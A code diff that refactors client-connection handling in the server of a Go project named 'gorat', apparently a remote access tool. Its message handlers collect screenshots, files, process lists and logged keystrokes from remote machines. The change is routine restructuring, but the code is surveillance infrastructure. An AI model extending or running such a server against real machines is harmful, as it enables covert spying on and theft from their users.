@@ -12,6 +12,7 @@ import (
 
 	"gorat/common"
 	"gorat/pkg/auth"
+	"gorat/pkg/clients"
 	"gorat/pkg/messaging"
 	"gorat/pkg/storage"
 
@@ -29,7 +30,7 @@ var upgrader = websocket.Upgrader{
 
 // Server represents the main server
 type Server struct {
-	manager            *ClientManager
+	manager            clients.Manager
 	store              storage.Store
 	config             *Config
 	authenticator      *Authenticator
@@ -64,7 +65,8 @@ type Config struct {
 
 // NewServer creates a new server instance
 func NewServer(config *Config) *Server {
-	manager := NewClientManager()
+	manager := clients.NewManager()
+	manager.Start()
 	sessionMgr := auth.NewSessionManager(24 * time.Hour)
 	terminalProxy := NewTerminalProxy(manager, sessionMgr)
 
@@ -110,9 +112,6 @@ func NewServer(config *Config) *Server {
 
 	// Set server reference in web handler
 	webHandler.server = server
-
-	// Set store reference in manager for merged client list
-	manager.SetStore(store)
 
 	return server
 }
@@ -171,8 +170,12 @@ func (s *Server) Shutdown(ctx context.Context) error {
 	// Close all client connections
 	clients := s.manager.GetAllClients()
 	for _, client := range clients {
-		log.Printf("Closing connection to client: %s", client.ID)
-		client.Conn.Close()
+		log.Printf("Closing connection to client: %s", client.ID())
+		conn := client.Conn()
+		if conn != nil {
+			conn.Close()
+		}
+		client.Close()
 	}
 
 	// Close database if available
@@ -196,7 +199,7 @@ func (s *Server) Start() error {
 	s.started = true
 	s.startedMu.Unlock()
 
-	go s.manager.Run()
+	// Manager is already started in NewServer()
 
 	// Start background task to mark offline clients
 	go s.monitorClientStatus()
@@ -358,19 +361,16 @@ func (s *Server) ginHandleClientGetQuery(c *gin.Context) {
 		return
 	}
 
-	// Return metadata only to avoid marshaling websocket.Conn and other internal fields
-	var meta *common.ClientMetadata
-	if client.Metadata == nil {
+	// Return metadata - extract from client using interface methods
+	meta := client.Metadata()
+	if meta == nil {
 		meta = &common.ClientMetadata{
-			ID:     client.ID,
+			ID:     client.ID(),
 			Status: "unknown",
 		}
-	} else {
-		meta = client.Metadata
-		// Ensure ID is populated from client struct if missing
-		if meta.ID == "" {
-			meta.ID = client.ID
-		}
+	} else if meta.ID == "" {
+		// Ensure ID is populated if missing
+		meta.ID = client.ID()
 	}
 
 	c.JSON(http.StatusOK, meta)
@@ -507,22 +507,35 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 		}
 	}
 
-	// Create client
-	client := &Client{
-		ID:       authPayload.ClientID,
-		Conn:     conn,
-		Metadata: metadata,
-		Send:     make(chan *common.Message, 256),
-		closed:   false,
+	// Register client with the manager
+	client, err := s.manager.RegisterClient(authPayload.ClientID, conn)
+	if err != nil {
+		log.Printf("Failed to register client: %v", err)
+		conn.Close()
+		return
 	}
 
-	s.manager.register <- client
+	// Update metadata with initial values (after registration)
+	client.UpdateMetadata(func(m *common.ClientMetadata) {
+		m.Token = token
+		m.OS = authPayload.OS
+		m.Arch = authPayload.Arch
+		m.Hostname = authPayload.Hostname
+		m.IP = authPayload.IP
+		m.PublicIP = publicIP
+		m.Status = "online"
+		m.ConnectedAt = time.Now()
+		m.LastSeen = time.Now()
+		if metadata.Alias != "" {
+			m.Alias = metadata.Alias
+		}
+	})
 
 	// Restore proxies for this client if it was previously configured
 	if s.proxyManager == nil {
 		s.proxyManager = NewProxyManager(s.manager, s.store)
 	}
-	go s.proxyManager.RestoreProxiesForClient(client.ID)
+	go s.proxyManager.RestoreProxiesForClient(client.ID())
 
 	// Start goroutines for reading and writing
 	go s.readPump(client)
@@ -530,25 +543,33 @@ func (s *Server) handleWebSocket(w http.ResponseWriter, r *http.Request) {
 }
 
 // readPump reads messages from the client
-func (s *Server) readPump(client *Client) {
+func (s *Server) readPump(client clients.Client) {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in readPump for client %s: %v", client.ID, r)
+			log.Printf("PANIC RECOVERED in readPump for client %s: %v", client.ID(), r)
 		}
-		s.manager.unregister <- client
-		client.Conn.Close()
+		s.manager.UnregisterClient(client.ID())
+		conn := client.Conn()
+		if conn != nil {
+			conn.Close()
+		}
 	}()
 
-	client.Conn.SetReadDeadline(time.Now().Add(90 * time.Second))
-	client.Conn.SetPongHandler(func(string) error {
-		client.Conn.SetReadDeadline(time.Now().Add(90 * time.Second))
+	conn := client.Conn()
+	if conn == nil {
+		return
+	}
+
+	conn.SetReadDeadline(time.Now().Add(90 * time.Second))
+	conn.SetPongHandler(func(string) error {
+		conn.SetReadDeadline(time.Now().Add(90 * time.Second))
 		return nil
 	})
 
 	for {
 		// First, read as raw JSON to check the message type
 		var rawMsg map[string]interface{}
-		err := client.Conn.ReadJSON(&rawMsg)
+		err := conn.ReadJSON(&rawMsg)
 		if err != nil {
 			if websocket.IsUnexpectedCloseError(err, websocket.CloseGoingAway, websocket.CloseAbnormalClosure) {
 				log.Printf("WebSocket error: %v", err)
@@ -557,7 +578,7 @@ func (s *Server) readPump(client *Client) {
 		}
 
 		// Update last seen
-		s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
+		s.manager.UpdateClientMetadata(client.ID(), func(m *common.ClientMetadata) {
 			m.LastSeen = time.Now()
 		})
 
@@ -609,54 +630,52 @@ func (s *Server) readPump(client *Client) {
 		jsonData, _ := json.Marshal(rawMsg)
 		var msg common.Message
 		if err := json.Unmarshal(jsonData, &msg); err != nil {
-			log.Printf("Failed to parse message from %s: %v", client.ID, err)
+			log.Printf("Failed to parse message from %s: %v", client.ID(), err)
 			continue
 		}
-
 		// Handle message
 		s.handleMessage(client, &msg)
 	}
 }
 
-// writePump writes messages to the client
-func (s *Server) writePump(client *Client) {
+func (s *Server) writePump(client clients.Client) {
+	// The new pkg/clients Manager handles write operations internally.
+	// This goroutine just needs to monitor the client's connection status
+	// and clean up if the client closes.
 	ticker := time.NewTicker(30 * time.Second)
 	defer func() {
-		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in writePump for client %s: %v", client.ID, r)
-		}
 		ticker.Stop()
-		client.Conn.Close()
+		// Note: Do NOT close the connection here - pkg/clients manages it
 	}()
+
+	conn := client.Conn()
+	if conn == nil {
+		return
+	}
 
 	for {
 		select {
-		case message, ok := <-client.Send:
-			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-			if !ok {
-				client.Conn.WriteMessage(websocket.CloseMessage, []byte{})
-				return
-			}
-
-			err := client.Conn.WriteJSON(message)
-			if err != nil {
-				return
-			}
-
 		case <-ticker.C:
-			client.Conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
-			if err := client.Conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+			// Send ping to keep connection alive
+			conn.SetWriteDeadline(time.Now().Add(10 * time.Second))
+			if err := conn.WriteMessage(websocket.PingMessage, nil); err != nil {
+				// Connection write failed, client will be cleaned up by readPump
 				return
 			}
+		}
+
+		// Check if client is still connected
+		if client.IsClosed() {
+			return
 		}
 	}
 }
 
 // handleMessage handles incoming messages from clients
-func (s *Server) handleMessage(client *Client, msg *common.Message) {
+func (s *Server) handleMessage(client clients.Client, msg *common.Message) {
 	defer func() {
 		if r := recover(); r != nil {
-			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID, r)
+			log.Printf("PANIC RECOVERED in handleMessage for client %s: %v", client.ID(), r)
 		}
 	}()
 
@@ -664,7 +683,7 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 	case common.MsgTypeHeartbeat:
 		var hb common.HeartbeatPayload
 		if err := msg.ParsePayload(&hb); err == nil {
-			s.manager.UpdateClientMetadata(client.ID, func(m *common.ClientMetadata) {
+			s.manager.UpdateClientMetadata(client.ID(), func(m *common.ClientMetadata) {
 				m.Status = hb.Status
 				m.LastHeartbeat = time.Now()
 			})
@@ -673,80 +692,80 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 	case common.MsgTypeCommandResult:
 		var cr common.CommandResultPayload
 		if err := msg.ParsePayload(&cr); err == nil {
-			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID, cr.Success, cr.ExitCode)
+			log.Printf("Command result from %s: success=%v, exit_code=%d", client.ID(), cr.Success, cr.ExitCode)
 			s.resultsMu.Lock()
-			s.commandResults[client.ID] = &cr
+			s.commandResults[client.ID()] = &cr
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Command result from %s: %s", client.ID, string(msg.Payload))
+			log.Printf("Command result from %s: %s", client.ID(), string(msg.Payload))
 		}
 
 	case common.MsgTypeFileList:
 		var fl common.FileListPayload
 		if err := msg.ParsePayload(&fl); err == nil {
-			log.Printf("File list from %s: %d files", client.ID, len(fl.Files))
+			log.Printf("File list from %s: %d files", client.ID(), len(fl.Files))
 			s.resultsMu.Lock()
-			s.fileListResults[client.ID] = &fl
+			s.fileListResults[client.ID()] = &fl
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("File list from %s", client.ID)
+			log.Printf("File list from %s", client.ID())
 		}
 
 	case common.MsgTypeDriveList:
 		var dl common.DriveListPayload
 		if err := msg.ParsePayload(&dl); err == nil {
-			log.Printf("Drive list from %s: %d drives", client.ID, len(dl.Drives))
+			log.Printf("Drive list from %s: %d drives", client.ID(), len(dl.Drives))
 			s.resultsMu.Lock()
-			s.driveListResults[client.ID] = &dl
+			s.driveListResults[client.ID()] = &dl
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Drive list from %s", client.ID)
+			log.Printf("Drive list from %s", client.ID())
 		}
 
 	case common.MsgTypeProcessList:
 		var pl common.ProcessListPayload
 		if err := msg.ParsePayload(&pl); err == nil {
-			log.Printf("Process list from %s: %d processes", client.ID, len(pl.Processes))
-			s.SetProcessListResult(client.ID, &pl)
+			log.Printf("Process list from %s: %d processes", client.ID(), len(pl.Processes))
+			s.SetProcessListResult(client.ID(), &pl)
 		} else {
-			log.Printf("Process list from %s", client.ID)
+			log.Printf("Process list from %s", client.ID())
 		}
 
 	case common.MsgTypeSystemInfo:
 		var si common.SystemInfoPayload
 		if err := msg.ParsePayload(&si); err == nil {
-			log.Printf("System info from %s: %s (%s %s)", client.ID, si.Hostname, si.OS, si.Arch)
-			s.SetSystemInfoResult(client.ID, &si)
+			log.Printf("System info from %s: %s (%s %s)", client.ID(), si.Hostname, si.OS, si.Arch)
+			s.SetSystemInfoResult(client.ID(), &si)
 		} else {
-			log.Printf("System info from %s", client.ID)
+			log.Printf("System info from %s", client.ID())
 		}
 
 	case common.MsgTypeFileData:
 		var fd common.FileDataPayload
 		if err := msg.ParsePayload(&fd); err == nil {
-			log.Printf("File data from %s: %s (%d bytes)", client.ID, fd.Path, len(fd.Data))
+			log.Printf("File data from %s: %s (%d bytes)", client.ID(), fd.Path, len(fd.Data))
 			s.resultsMu.Lock()
-			s.fileDataResults[client.ID] = &fd
+			s.fileDataResults[client.ID()] = &fd
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("File data from %s", client.ID)
+			log.Printf("File data from %s", client.ID())
 		}
 
 	case common.MsgTypeScreenshotData:
 		var sd common.ScreenshotDataPayload
 		if err := msg.ParsePayload(&sd); err == nil {
-			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID, sd.Width, sd.Height, len(sd.Data))
+			log.Printf("Screenshot received from %s: %dx%d, %d bytes", client.ID(), sd.Width, sd.Height, len(sd.Data))
 			s.resultsMu.Lock()
-			s.screenshotResults[client.ID] = &sd
+			s.screenshotResults[client.ID()] = &sd
 			s.resultsMu.Unlock()
 		} else {
-			log.Printf("Screenshot received from %s", client.ID)
+			log.Printf("Screenshot received from %s", client.ID())
 		}
 
 	case common.MsgTypeKeyloggerData:
 		var kld common.KeyloggerDataPayload
 		if err := msg.ParsePayload(&kld); err == nil {
-			log.Printf("Keylogger data from %s: %s", client.ID, kld.Keys)
+			log.Printf("Keylogger data from %s: %s", client.ID(), kld.Keys)
 		}
 
 	case common.MsgTypeUpdateStatus:
@@ -765,7 +784,7 @@ func (s *Server) handleMessage(client *Client, msg *common.Message) {
 		// Heartbeat response
 
 	default:
-		log.Printf("Unknown message type from %s: %s", client.ID, msg.Type)
+		log.Printf("Unknown message type from %s: %s", client.ID(), msg.Type)
 	}
 }
 
@@ -775,9 +794,10 @@ func (s *Server) handleGetClients(w http.ResponseWriter, r *http.Request) {
 	metadata := make([]*common.ClientMetadata, len(clients))
 
 	for i, client := range clients {
-		client.mu.RLock()
-		metadata[i] = client.Metadata
-		client.mu.RUnlock()
+		meta := client.Metadata()
+		if meta != nil {
+			metadata[i] = meta
+		}
 	}
 
 	w.Header().Set("Content-Type", "application/json")
@@ -1010,16 +1030,21 @@ func (s *Server) monitorClientStatus() {
 
 	for range ticker.C {
 		// Save all currently connected clients to database
-		clients := s.manager.GetClients()
-		for _, metadata := range clients {
-			if err := s.store.SaveClient(metadata); err != nil {
-				log.Printf("Error saving client %s: %v", metadata.ID, err)
+		allClients := s.manager.GetAllClients()
+		for _, client := range allClients {
+			metadata := client.Metadata()
+			if metadata != nil && s.store != nil {
+				if err := s.store.SaveClient(metadata); err != nil {
+					log.Printf("Error saving client %s: %v", client.ID(), err)
+				}
 			}
 		}
 
 		// Mark clients as offline if not seen recently (2 minutes)
-		if err := s.store.MarkOffline(2 * time.Minute); err != nil {
-			log.Printf("Error marking offline clients: %v", err)
+		if s.store != nil {
+			if err := s.store.MarkOffline(2 * time.Minute); err != nil {
+				log.Printf("Error marking offline clients: %v", err)
+			}
 		}
 	}
 }
